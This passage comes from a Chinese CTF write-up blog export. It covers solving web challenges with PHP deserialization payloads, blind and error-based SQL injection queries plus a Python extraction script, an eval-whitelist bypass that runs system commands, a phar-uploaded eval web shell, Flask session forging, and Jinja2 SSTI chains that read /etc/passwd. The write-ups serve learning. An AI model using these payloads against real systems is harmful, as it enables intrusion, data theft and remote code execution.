O:6:&quot;Handle&quot;:2:{s:14:&quot;%00Handle%00handle&quot;;O:4:&quot;Flag&quot;:3: {s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:5:&quot;token&quot;;s:32:&quot;12f73080e04ce0d8e95defb577ebc3f4&quot;; s:10:&quot;token_flag&quot;;R:4;}} 最终payload： http://cce097dcc8944553906620bb82f4ad36dd057d6462bd4e30.changame.ichunqiu.com ///?file=hint.php&amp;payload=O:6:&quot;Handle&quot;:2:{s:14:&quot;%00Handle%00handle&quot;; O:4:&quot;Flag&quot;:3:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:5: &quot;token&quot;;s:32:&quot;12f73080e04ce0d8e95defb577ebc3f4&quot;;s:10:&quot;token_flag&quot;;R:4;}} 拿到flag web2 全世界最简单的SQL过滤了一堆东西，or|benchmarksleepifget_lockcase 时间盲注过滤了三个sleep、benchmark和get_lock函数，但是后来超哥发现可以通过rpad或repeat构造长字符串，加以计算量大的pattern，通过repeat的参数可以控制延时长短。 admin&apos; union select rpad(&apos;a&apos;,4999999,&apos;a&apos;) RLIKE concat(repeat(&apos;(a.*)+&apos;,30),&apos;b&apos;)# 确实可以产生延迟，但是延迟之后是404，而且由于过滤了if，无法通过延迟进行查询，卡住）之后队友发现通过pow函数，在某一特定范围内显示的登陆失败，超过某一范围是数据库操作失败，测试后发现’ union select pow(2,2014) #数据库操作失败，2013就是登陆失败，以此结合查询语句找到数据库名语句： a&apos;union select pow(2,1997+ascii(substr(database(),1,1)))# 不知道为啥python显示中文为乱码，后来发现需要a.content.decode(‘utf-8’),虚拟机里跑不出来，需要装个python环境了 import requests i=96 j=0 r=requests.session() for j&lt;20: while i&lt;156: url=&apos;http://7325a6806d8140fd91c5b9b3082a6ed240b2e3ab52c64a46.changame.ichunqiu.com/?tdsourcetag=s_pctim_aiomsg&apos; data={&apos;username&apos;:&apos;a\&apos;union select pow(2,&quot;+str(2013-i)&quot;+ascii(substr(database(),&quot;+str(j)+&quot;,1))) #&apos;,&apos;password&apos;:&apos;1&apos;} a=r.post(url,data=data) if&quot;数据库操作失败&quot;in a.content.decode(&apos;utf-8&apos;): print(i) break else :i=i+1 j=j+1 print(i) 得到数据库名ctf，现在问题是or被ban了，information也不能用了，没法查表名没法查列名，老大说可以子查询绕过，通过构造子查询 给本来被ban（或者爆不出）的字段名换了个”名字”先构造子查询的联合查询语句并指定别名 1&apos; UNION SELECT 1,2,admin_x,4,5 FROM (SELECT 1 as admin_1,2 as admin_2,3 as admin_3 from admin WHERE 1=2 UNION SELECT * from admin)x %23 猜到表名为user，照着老大的博客构造还弄了好久，那个别名需要定义，否则会出错 a&apos; union select pow(2,1997+ascii(substr((select admin_2 from (select 1 as admin_1 ,2 as admin_2 from user where 1=2 union select * from user)x) ,2,1))) # 改造上面的脚本爆出密码（队友爆出来的，脚本出了问题，burp手注，太慢了，菜醒）得到密码登陆。 其他师傅们的思路 select cot(0)报错，select cot(1) 可以执行，之后就是布尔盲注结合子查询。 web3 love_math&lt;?php error_reporting(0); //听说你很喜欢数学，不知道你是否爱它胜过爱flag if(!isset($_GET[&apos;c&apos;])){ show_source(__FILE__); }else{ //例子 c=20-1 $content = $_GET[&apos;c&apos;]; if (strlen($content) &gt;= 80) { die(&quot;太长了不会算&quot;); } $blacklist = [&apos; &apos;, &apos;\t&apos;, &apos;\r&apos;, &apos;\n&apos;,&apos;\&apos;&apos;, &apos;&quot;&apos;, &apos;`&apos;, &apos;\[&apos;, &apos;\]&apos;]; foreach ($blacklist as $blackitem) { if (preg_match(&apos;/&apos; . $blackitem . &apos;/m&apos;, $content)) { die(&quot;请不要输入奇奇怪怪的字符&quot;); } } //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = [&apos;abs&apos;, &apos;acos&apos;, &apos;acosh&apos;, &apos;asin&apos;, &apos;asinh&apos;, &apos;atan2&apos;, &apos;atan&apos;, &apos;atanh&apos;, &apos;base_convert&apos;, &apos;bindec&apos;, &apos;ceil&apos;, &apos;cos&apos;, &apos;cosh&apos;, &apos;decbin&apos;, &apos;dechex&apos;, &apos;decoct&apos;, &apos;deg2rad&apos;, &apos;exp&apos;, &apos;expm1&apos;, &apos;floor&apos;, &apos;fmod&apos;, &apos;getrandmax&apos;, &apos;hexdec&apos;, &apos;hypot&apos;, &apos;is_finite&apos;, &apos;is_infinite&apos;, &apos;is_nan&apos;, &apos;lcg_value&apos;, &apos;log10&apos;, &apos;log1p&apos;, &apos;log&apos;, &apos;max&apos;, &apos;min&apos;, &apos;mt_getrandmax&apos;, &apos;mt_rand&apos;, &apos;mt_srand&apos;, &apos;octdec&apos;, &apos;pi&apos;, &apos;pow&apos;, &apos;rad2deg&apos;, &apos;rand&apos;, &apos;round&apos;, &apos;sin&apos;, &apos;sinh&apos;, &apos;sqrt&apos;, &apos;srand&apos;, &apos;tan&apos;, &apos;tanh&apos;]; preg_match_all(&apos;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&apos;, $content, $used_funcs); foreach ($used_funcs[0] as $func) { if (!in_array($func, $whitelist)) { die(&quot;请不要输入奇奇怪怪的函数&quot;); } } //帮你算出答案 eval(&apos;echo &apos;.$content.&apos;;&apos;); } 有个eval ‘.’可以实现字符串的拼接，后来发现对16进制及以上进制异或运算可以得到字母，所给白名单又有base_convert函数，构造 base_convert(1751504350,10,36)(base_convert(784,10,36));（语句是system（ls）） 看得到flag，但是现在问题是，cat flag.php 需要空格和.,用代替发现还是需要空格，cat&lt;f中&lt;又被处理成了小于号，卡住） 异或运算，用两个白名单函数和空格+异或，得到十进制数字，dechex后再与那两个白名单函数异或，就可以回到空格，就可以执行system（cat *）拿到flag，队友写的脚本，还不会写php，回头研究下（菜是原罪 base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(19)^tan^exp)) （语句是system(cat *)点号将cat和 *拼接了起来 其他队伍使用的是 system(getallheaders(){9})，然后在headers里传了个9，tql⑧。 web4 RefSpace文件包含，前面有文件读取操作phar://将 &lt;?php @eval($_POST[a]);?&gt; 写入1.php，将1.php压缩到1.zip，改后缀为1.jpg ?route=phar://upload/1.jpg.jpg/&amp;a= 用蚁剑连接可以拿shell；]]></content>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[flask伪造session]]></title>
    <url>%2F2019%2F04%2F07%2Fflask%E4%BC%AA%E9%80%A0session%2F</url>
    <content type="text"><![CDATA[flask伪造sessiongithub的脚本 &quot;&quot;&quot; Flask Session Cookie Decoder/Encoder &quot;&quot;&quot; __author__ = &apos;Wilson Sumanang, Alexandre ZANNI&apos; import sys import zlib from itsdangerous import base64_decode import ast import argparse parser = argparse.ArgumentParser( description=&apos;Flask Session Cookie Decoder/Encoder&apos;, epilog=&quot;Author : Wilson Sumanang, Alexandre ZANNI&quot;) subparsers = parser.add_subparsers(help=&apos;sub-command help&apos;, dest=&apos;subcommand&apos;) parser_encode = subparsers.add_parser(&apos;encode&apos;, help=&apos;encode&apos;) parser_encode.add_argument(&apos;-s&apos;, &apos;--secret-key&apos;, metavar=&apos;&lt;string&gt;&apos;, help=&apos;Secret key&apos;, required=True) parser_encode.add_argument(&apos;-t&apos;, &apos;--cookie-structure&apos;, metavar=&apos;&lt;string&gt;&apos;, help=&apos;Session cookie structure&apos;, required=True) parser_decode = subparsers.add_parser(&apos;decode&apos;, help=&apos;decode&apos;) parser_decode.add_argument(&apos;-s&apos;, &apos;--secret-key&apos;, metavar=&apos;&lt;string&gt;&apos;, help=&apos;Secret key&apos;, required=False) parser_decode.add_argument(&apos;-c&apos;, &apos;--cookie-value&apos;, metavar=&apos;&lt;string&gt;&apos;, help=&apos;Session cookie value&apos;, required=True) args = parser.parse_args() from flask.sessions import SecureCookieSessionInterface class MockApp(object): def __init__(self, secret_key): self.secret_key = secret_key def session_cookie_encoder(secret_key, session_cookie_structure): &quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot; try: app = MockApp(secret_key) session_cookie_structure = dict(ast.literal_eval(session_cookie_structure)) si = SecureCookieSessionInterface() s = si.get_signing_serializer(app) return s.dumps(session_cookie_structure) except Exception as e: return &quot;[Encoding error]{}&quot;.format(e) def session_cookie_decoder(session_cookie_value, secret_key=None): &quot;&quot;&quot; Decode a Flask cookie &quot;&quot;&quot; try: if(secret_key==None): compressed = False payload = session_cookie_value if payload.startswith(b&apos;.&apos;): compressed = True payload = payload[1:] data = payload.split(&quot;.&quot;)[0] data = base64_decode(data) if compressed: data = zlib.decompress(data) return data else: app = MockApp(secret_key) si = SecureCookieSessionInterface() s = si.get_signing_serializer(app) return s.loads(session_cookie_value) except Exception as e: return &quot;[Decoding error]{}&quot;.format(e) if __name__ == &quot;__main__&quot;: if(args.subcommand == &apos;encode&apos;): if(args.secret_key is not None and args.cookie_structure is not None): print(session_cookie_encoder(args.secret_key, args.cookie_structure)) elif(args.subcommand == &apos;decode&apos;): if(args.secret_key is not None and args.cookie_value is not None): print(session_cookie_decoder(args.cookie_value,args.secret_key)) elif(args.cookie_value is not None): print(session_cookie_decoder(args.cookie_value)) # 加密示例 $ python2 session_cookie_manager.py encode -s &apos;.{y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV};K|ghT^d&apos; -t &apos;{&quot;number&quot;:&quot;326410031505&quot;,&quot;username&quot;:&quot;admin&quot;}&apos; 输出：eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw 解密示例 $ python2 session_cookie_manager.py decode -c &apos;eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw&apos; -s &apos;.{y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV};K|ghT^d&apos; 输出：{u&apos;username&apos;: &apos;admin&apos;, u&apos;number&apos;: &apos;326410031505&apos;} 无密钥：$ python2 session_cookie_manager.py decode -c &apos;eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw&apos; hgame的happypython就是先解密session再将id改为1后加密，替换session即可登陆。]]></content>
      <categories>
        <category>WP</category>
      </categories>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSTI(1)]]></title>
    <url>%2F2019%2F04%2F07%2FSSTI-1%2F</url>
    <content type="text"><![CDATA[前段时间被转专业考试逼疯，鸽了一堆比赛（不鸽也不会做，菜哭）把之前的知识补一下，从cg讲的ssti开始吧。hexo插件问题会把两个大括号里的内容按变量处理，下文用一个代替 SSTI服务器模板注入什么是SSTI？ SSTI全称Server-Side-Template-Injection，即服务端模版注入攻击。 攻击成因是服务端模版引擎将用户的输入直接渲染进模版，而未做过滤或者对象关系映射(ORM)。 这样，攻击者可以控制渲染进模版的内容。通过直接输入模版渲染的关键词例如{ }，即可将恶意代码注入模版中执行。最严重的后果是getshell。 现在有很多常见的模版渲染引擎，而最常用也最长出问题的Web框架就是基于Python的Flask框架了。 注入姿势：内省config对象config对象是一个Flask模板全局变量，代表“当前配置对象(flask.config）”。它是一个类似于字典的对象，其中包含了应用程序所有的配置值，包含若干独特方法的子类：from_envvar，from_object，from_pyfile，以及root_path。在大多数情况下，会包含数据库连接字符串，第三方服务凭据，SECRET_KEY之类的敏感信息。 对于新加载的模块，from_object方法会将那些变量名全是大写的属性添加到config对象中。注入payload{ config.items() }就可以轻松查看这些配置了。 使用非常重要的内省组件：__mro__和__subclasses__属性。__mro__中的MRO代表方法解析顺序，并且在这里定义为，“是一个包含类的元组，而其中的类就是在方法解析的过程中在寻找父类时需要考虑的类”。__mro__属性以包含类的元组来显示对象的继承关系，它的父类，父类的父类，一直向上到object（如果是使用新式类的话）。它是每个对象的元类属性，但它却是一个隐藏属性，因为Python在进行内省时明确地将它从dir的输出中移除了（见Objects/object.c的第1812行）。 __subclasses__属性则在这里被定义为一个方法，“每个新式类保留对其直接子类的一个弱引用列表。此方法返回那些引用还存在的子类”。 使用__mro__属性来访问对象的父类，使用__subclasses__属性来访问对象的子类 使用索引2来选择object类。现在我们到达了object类，我们使用/subclasses属性来dump应用程序中使用的所有类（找到file类的索引）找到object: { ‘’.__class__.__mro__[2].__subclasses__() } 任意文件读取： { ‘’.__class__.__mro__[2].__subclasses__()[40](‘/etc/passwd’).read() } [os]模块通过os模块可以进行一些文件的操作 {[].\__class__.\__base__.\__subclasses__()} 的方法来访问所有模块访问os模块都是从warnings.catch_warnings模块入手的。找到catch_warnings的位置(上面查到的所有模块的索引，这里是59，即第59个模块)； 知道了位置后，再用func_globals看看该模块有哪些global函数; 在url后面输入 {[].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys()}这里能看到linecache，我们要访问的os模块就在这里，现在我们看看这个模块的各种属性： 在url后面输入 {[].__class__.__base__.__subclasses__()[59].__init__.func_globals[‘linecache’].__dict__}然后在很长的返回值里就可以找到os模块了然后就可以用 {[].\__class__.\__base__.\__subclasses__()[59].\__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;o&apos;+&apos;s&apos;]} 来代替os模块的使用了，之所以写__dict__[‘o’+’s’]，而不写__dict__[‘os’],是因为os这个字符串被禁用了，只能使用python里面字符串的拼接绕过现在os.read() [].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;o&apos;+&apos;s&apos;].read() [].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;o&apos;+&apos;s&apos;].open() [].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;o&apos;+&apos;s&apos;].listdir(&apos;.&apos;) cg题的payload http://ssh2.evi0s.com:8080/%7B%7B[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;o&apos;+&apos;s&apos;].listdir(&apos;..&apos;)%7D%7D 看到flag文件 文件读取打开 http://ssh2.evi0s.com:8080/%7B%7B[].__class__.__base__.__subclasses__()[40](&apos;/Th1s_th3_fl1l1l11llll1g&apos;).read()%7D%7D 过滤了class怎么办，base64编码绕过，招新赛的payload http://132.232.92.163:6733/?name={[].__getattribute__(&apos;X19jbGFzc19f%27.decode(%27base64&apos;)).__base__.__getattribute__([].__getattribute__(&apos;X19jbGFzc19f&apos;.decode(&apos;base64&apos;)).__base__,&apos;X19zdWJjbGFzc2VzX18=&apos;.decode(&apos;base64&apos;))()[58].__init__.func_globals[&apos;linecache&apos;].__dict__.os.listdir(&quot;/home/blacsheep/&quot;)}]]></content>
      <categories>
        <category>WP</category>
      </categories>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hgame(php)]]></title>
    <url>%2F2019%2F02%2F14%2Fhgame-php%2F</url>
    <content type="text"><![CDATA[杭电vidar的hgame，其中几道php的题，写一下学到的。 php trick 十多个php的绕过，题目挂了，用了一个师傅博客里的图片（之前忘写了，懒~） （1）==和!=之间不会去判断数据类型，1和2又都被强制转换为了字符型，所以不能用数组，可用0e开头的MD5值绕过 （2）===则会判断数据类型，两个必须完全相等才返回true，所以用数组绕过，不同值的数组都返回0（详细见https://blog.csdn.net/qq_19980431/article/details/83018232） （3） php里的特性+和.会被解析为_,所以H_game写为H+game,或者是$_SERVER[‘QUERY_STRING’] 是不会自动URLDecode 的，所以我们只需要传个URL编码过的参数名即可绕过这里 （4） 数组绕过 （5）这里被难住了，必须是http开头，开头的提示为admin.php,本来想着可以file协议忽略前面的地址直接读取文件内容，但是http的限制没法绕过parse_url 里的 PHP_URL_HOST 参数获取的是 最后一个@ 符号后面的域名，而 curl 使用的是第一个 @ 符号后面的域名，又有only localhost的提示，这样我们就可以用 http://@127.0.0.1:80@www.baidu.com/admin.php 来绕过,从而读取admin.php （6）这里又卡住了，之前做bugku的时候对file_getcontent理解不到位，file_getcontent内容可以执行为协议，所以直接filename=php://filter/read=convert.base64-encode/resource=flag.php就可以绕过php_exits. （7）最终payload为：str1=s878926199a&amp;str2=s155964671a&amp;str3[]=22&amp;str4[]=1&amp;H+game[]=9e10000000000%00&amp;url=http://@127.0.0.1:80@www.baidu.com/admin.php?filename=php://filter/read=convert.base64-encode/resource=flag.php php is the best language我们需要POST的参数，door，key，gate。但这里secret是未知的，所以我们需要对door进行处理使secert的值为空，对于hash_mac函数hash_hmac ( string $algo , string $data , string $key [, bool $raw_output = FALSE ] ) : string参数algo：要使用的哈希算法名称，例如：”md5”，”sha256”，”haval160,4” 等。data：要进行哈希运算的消息。key：使用 HMAC 生成信息摘要时所使用的密钥raw_output：设置为 TRUE 输出原始二进制数据， 设置为 FALSE 输出小写 16 进制字符串。 当data的数据为数组时，返回空，所以传入data[]=0,secret的值就变成了null，然后gate的值是对key进行shal256加密，密钥为空。key的值可以确定，这里又是MD5碰撞的问题，在网上找到了一篇博客，下附地址：https://www.k2zone.cn/?p=2019双MD5，得到key可取key=7r4lGXCH2Ksu2JNT3BYM之后可求gatephp&gt; var_dump(hash_hmac(‘sha256’, ‘7r4lGXCH2Ksu2JNT3BYM’, NULL)) string(64) “81f581b7553943f5041f054ca92e5e7e490e2c40296a93d94d214f1 36aa84fe6” 最终payloadgate=81f581b7553943f5041f054ca92e5e7e490e2c40296a93d94d2 14f136aa84fe6&amp;key=7r4lGXCH2Ksu2JNT3BYM&amp;door[]=1]]></content>
      <categories>
        <category>WP</category>
      </categories>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python爬虫]]></title>
    <url>%2F2019%2F02%2F07%2FPython%E7%88%AC%E8%99%AB%2F</url>
    <content type="text"><![CDATA[hgame的爬虫题，做到一半就卡住了，菜是原罪，整理一下关于爬虫的知识，requests库、urllib库、re库和Beautifulsoup库。咕~ hgame里的baby-spider，一开始直接被反日，虚拟机关机，提醒写爬虫要加浏览器伪造，后来一直显示you are wrong，最后看了别人的脚本才发现是css上出了问题，把第十次之后的cookie打印下来再传到浏览器上可以发现爬取的题目与显示的题目无关，网页上的渲染把题目修改了，加载公式时在network里可以看到引用了一个新的字体，利用python 里的函数 str.maketrans() 可以把css渲染后的字体转换出来 fuck = str.maketrans(&apos;01345679&apos;, &apos;10694357&apos;) question = getquestion1() b = question.translate(fuck) 第三步 .question-container span{ display: none; } .question-container{ font-family: Ariali; font-weight: bold; } .question-container:after{ content:&quot;(776299203/883952569)+(547789483)*683263066-(215127140)=?&quot;; } 直接爬取style.css里的 .question-container:after里的content内容]]></content>
      <categories>
        <category>WP</category>
      </categories>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MD5碰撞]]></title>
    <url>%2F2019%2F01%2F30%2FMD5%E7%A2%B0%E6%92%9E%2F</url>
    <content type="text"><![CDATA[ctf中md5常见绕过 字符串0ePHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904 s214587387a 0e848240448830537924465865611904 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s1885207154a 0e509367213418206700842008763514 s1502113478a 0e861580163291561247404381396064 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s155964671a 0e342768416822451524974117254469 s1184209335a 0e072485820392773389523109082030 s1665632922a 0e731198061491163073197128363787 s1502113478a 0e861580163291561247404381396064 s1836677006a 0e481036490867661113260034900752 s1091221200a 0e940624217856561557816327384675 s155964671a 0e342768416822451524974117254469 s1502113478a 0e861580163291561247404381396064 s155964671a 0e342768416822451524974117254469 s1665632922a 0e731198061491163073197128363787 s155964671a 0e342768416822451524974117254469 s1091221200a 0e940624217856561557816327384675 s1836677006a 0e481036490867661113260034900752 s1885207154a 0e509367213418206700842008763514 s532378020a 0e220463095855511507588041205815 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s214587387a 0e848240448830537924465865611904 s1502113478a 0e861580163291561247404381396064 s1091221200a 0e940624217856561557816327384675 s1665632922a 0e731198061491163073197128363787 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s1665632922a 0e731198061491163073197128363787 s878926199a 0e545993274517709034328855841020 数组绕过&lt;?php highlight_file(__file__); include &quot;flag.php&quot;; if (!isset($_GET[&apos;a&apos;]) || !isset($_GET[&apos;b&apos;])) { die(&quot;GET me a &amp; b&quot;); } if ($_GET[&apos;a&apos;] !== $_GET[&apos;b&apos;] &amp;&amp; md5($_GET[&apos;a&apos;]) === md5($_GET[&apos;b&apos;])) { echo $flag; } else { echo &quot;No No No&quot;; } ?&gt; 当MD5接受的参数为数组时，其值都为0，所以构造payload： ?a[]=1&amp;b[]=2 真实碰撞&lt;?php highlight_file(__file__); include &quot;flag.php&quot;; if (!isset($_GET[&apos;a&apos;]) || !isset($_GET[&apos;b&apos;])) { die(&quot;GET me a &amp; b&quot;); } if ((string) $_GET[&apos;a&apos;] !== (string) $_GET[&apos;b&apos;] &amp;&amp; md5($_GET[&apos;a&apos;]) === md5($_GET[&apos;b&apos;])) { echo $flag; } else { echo &quot;No No No&quot;; } ?&gt; “===”以及强制字符串类型转换，这时只能用真实碰撞了 碰撞工具fastcoll下载地址：http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip 创建a.txt,内容为1 运行fastcoll 输入以下参数。 -p 是源文件 -o 是输出文件 fastcoll_v1.0.0.5.exe -p a.txt -o 1.txt 2.txt 生成两个md5值相同，但实际内容不同的文件 &lt;?php function readmyfile($path){ $fh = fopen($path, &quot;rb&quot;); $data = fread($fh, filesize($path)); fclose($fh); return $data; } echo &apos;二进制hash &apos;. md5( (readmyfile(&quot;1.txt&quot;))); echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;; echo &apos;URLENCODE &apos;. urlencode(readmyfile(&quot;1.txt&quot;)); echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;; echo &apos;URLENCODE hash &apos;.md5(urlencode (readmyfile(&quot;1.txt&quot;))); echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;; echo &apos;二进制hash &apos;.md5( (readmyfile(&quot;2.txt&quot;))); echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;; echo &apos;URLENCODE &apos;. urlencode(readmyfile(&quot;2.txt&quot;)); echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;; echo &apos;URLENCODE hash &apos;.md5( urlencode(readmyfile(&quot;2.txt&quot;))); echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;; 传入两个文件输出的urlencode即可]]></content>
      <categories>
        <category>基础</category>
      </categories>
      <tags>
        <tag>基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL攻击]]></title>
    <url>%2F2019%2F01%2F27%2FSQL%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[sqlhgame两道sql题都不算太难，有验证不过没过滤，再次响起招新被时间盲注支配的恐惧~，整理一下大致的框架， 数字型和字符型按查询的数据类型可以分为数字和字符型 判断方式：?id=1 and 1=1返回正确则是数字型?id=1’and’1’=’2返回正确则是字符型 有回显的注入:联合查询查询语句 表名 select column_name from information_schema.tables where table_schema =database() limit 0,1 列名 select column_name from information_schema.columns where table_name=&#39;表名&#39; limit 0,1 内容 SELECT concat(username,0x3a,0x7e) FROM 列名 limit 3,1 盲注：布尔盲注时间盲注基于报错型的盲注extractvalue/updatexml型注入 &#39;&amp;&amp; extractvalue(1,concat(0x7e,(select database()),0x7e))# %27%26%26%0aextractvalue(1,concat(0x7e,(select database()),0x7e))%23 1&#39;%26%26 1=extractvalue(1,database())%23 双注入公式select count(*),concat((select database()), floor(rand()*2))as a from information_schema.tables group by a; floor报错注入 爆数据库1&#39;and(select 1 from(select count(*),concat((select (select (select concat(0x7e,* ,0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&amp;code=uoEJ 爆表1&#39;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+ 爆列1&#39;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,) FROM information_schema.columns where table_name=&#39;fl444g&#39; LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+ 爆字段1&#39;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,fl444g_is_here,0x3a,0x23) FROM fl444g limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+ 注意编码问题注意空格，前面的select &amp;&amp;%0aselect limit 0,1从第0个开始取一个。 sql约束攻击BugKu login1题目hint里给了是基于约束的sql攻击，搜索了一下，]]></content>
      <categories>
        <category>WP</category>
      </categories>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku(2)]]></title>
    <url>%2F2018%2F12%2F26%2FBugku-2%2F</url>
    <content type="text"><![CDATA[Web8/welcome to bugkuctfphp变量覆盖漏洞&lt;?phpextract($_GET);if (!empty($ac)){$f = trim(file_get_contents($fn));if ($ac === $f){echo “This is flag:” .” $flag”;}else{echo”sorry!”;}}?&gt; 先说一下php函数extract() 函数从数组中将变量导入到当前的符号表。该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。第二个参数 type 用于指定当某个变量已经存在，而数组中又有同名元素时，extract() 函数如何对待这样的冲突。该函数返回成功导入到符号表中的变量数目。 trim(string,charlist)string 必需。规定要检查的字符串。charlist可选。规定从字符串中删除哪些字符。如果被省略，则移除以下所有字符：“\0” - NULL“\t” - 制表符“\n” - 换行“\x0B” - 垂直制表符“\r” - 回车“ “ - 空格 empty()和isset()PHP的isset()函数 一般用来检测变量是否设置 若变量不存在则返回 FALSE若变量存在且其值为NULL，也返回 FALSE若变量存在且值不为NULL，则返回 TURE PHP的empty()函数 判断值为否为空 若变量不存在则返回 TRUE若变量存在且其值为””、0、”0”、NULL、、FALSE、array()、var $var; 以及没有任何属性的对象，则返回 TURE若变量存在且值不为””、0、”0”、NULL、、FALSE、array()、var $var; 以及没有任何属性的对象，则返回 FALSE php封装协议php://input写入fn的值与a相同即可注意要用post方法，且注意是在那个php文件下执行的该操作 php反序列化welcome to the bugkuctf中利用php封装协议读取index.php和hint.php的内容得到全部的源码，可知flag在flag.php里，但是需要绕过一步正则匹配的限制。 hint.php&lt;?php class Flag{//flag.php public $file; public function __tostring(){ if(isset($this-&gt;file)){ echo file_get_contents($this-&gt;file); echo ““; return (“good”); } }}?&gt; index.php&lt;?php$txt = $_GET[“txt”];$file = $_GET[“file”];$password = $_GET[“password”]; if(isset($txt)&amp;&amp;(file_get_contents($txt,’r’)===”welcome to the bugkuctf”)){ echo “hello friend!“; if(preg_match(“/flag/“,$file)){ echo “不能现在就给你flag”; exit(); }else{ include($file); $password = unserialize($password); echo $password; }}else{ echo “you are not the number of bugku ! “;} ?&gt; 源码中可以看到如果没有匹配到flag的话就会引用file的文件，所以file=hint.php，password的值进行序列化构造，当序列化对象时，PHP 将试图在序列动作之前调用该对象的成员函数 sleep()。这样就允许对象在被序列化之前做任何清除操作。类似的，当使用 unserialize() 恢复对象时， 将调用 wakeup() 成员函数。unserialize()函数变量可控所以就可以构造payload使得hint.php的全局变量file为flag.phppassword=O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}最终构造的payload为?txt=php://input&amp;file=hint.php&amp;password=O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}]]></content>
      <categories>
        <category>WP</category>
      </categories>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku]]></title>
    <url>%2F2018%2F12%2F21%2FBugku%2F</url>
    <content type="text"><![CDATA[Bugku补题 备份是个好习惯题目不难涉及到的php函数比较多，都是现查的，记一下开始备份提示，查看临时文件index.php~或者index.php.bakindex.php.bak中有源码 strstr(str1,str2) 函数用于判断字符串str2是否是str1的子串。如果是，则该函数返回str2在str1中首次出现的地址；否则，返回NULL。&lt;?php echo strstr(“Helloworld!”,”world”);?&gt;输出：world! $_SERVER[‘REQUEST_URI’]http://localhost(域名或者ip地址)/aaa/index.php?p=222&amp;q=333结果：$_SERVER[‘QUERY_STRING’]=”p=222&amp;q=333”;$_SERVER[‘REQUEST_URI’]=”/aaa/index.php?p=222&amp;q=333”;$_SERVER[‘SCRIPT_NAME’]=”/aaa/index.php”;$_SERVER[‘PHP_SELF’]=”/aaa/index.php”; 由实例可知：$_SERVER[“QUERY_STRING”] 获取查询 语句，实例中可知，获取的是?后面的值$_SERVER[“REQUEST_URI”] 获取 http://localhost 后面的值，包括/$_SERVER[“SCRIPT_NAME”] 获取当前脚本的路径，如：index.php$ _SERVER[“PHP_SELF”] 当前正在执行脚本的文件名 substr(string,start,length)substr() 函数返回字符串的一部分。length不必需。echo substr(“Hello world”,6);输出第六个字符之后的输出：world 